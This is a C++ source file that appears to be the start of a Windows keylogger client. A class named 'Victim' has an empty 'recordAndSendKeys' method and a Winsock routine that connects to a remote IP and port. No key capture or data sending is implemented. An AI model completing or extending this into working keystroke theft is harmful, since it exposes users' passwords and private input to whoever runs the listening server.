#include "Victim.h"

void Victim::recordAndSendKeys() {
}

Victim::Victim(const std::string& targetIpAddr)  {
	this->_targetIpAddr = targetIpAddr;
}

int Victim::connectToServer() {
	int res = 0;

	res = WSAStartup(MAKEWORD(2, 2), &this->_wsaData);
	if (res != 0) {
		std::cerr << "winsock initialization failed" << std::endl;
		return res;
	}

	_addr.sin_family = AF_INET;
	_addr.sin_port = htons(CONNECTION_PORT);
	InetPtonA(AF_INET, this->_targetIpAddr.c_str(), &this->_addr.sin_addr.s_addr);

	this->_connectionSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (this->_connectionSocket == INVALID_SOCKET) {
		std::cerr << "Socket creation failed." << std::endl;
		WSACleanup();
		return -1;
	}

	std::cout << "Connecting to server" << std::endl;
	if (connect(this->_connectionSocket, (SOCKADDR*)&this->_addr, sizeof(this->_addr)) == -1) {
		std::cerr << "Error while connecting to target." << std::endl;
		closesocket(this->_connectionSocket);
		WSACleanup();
		return -1;
	}
	std::cout << "Connected to target.\nIP: " << this->_targetIpAddr << "\t" << "Port: " << CONNECTION_PORT << std::endl;

	return 0;
}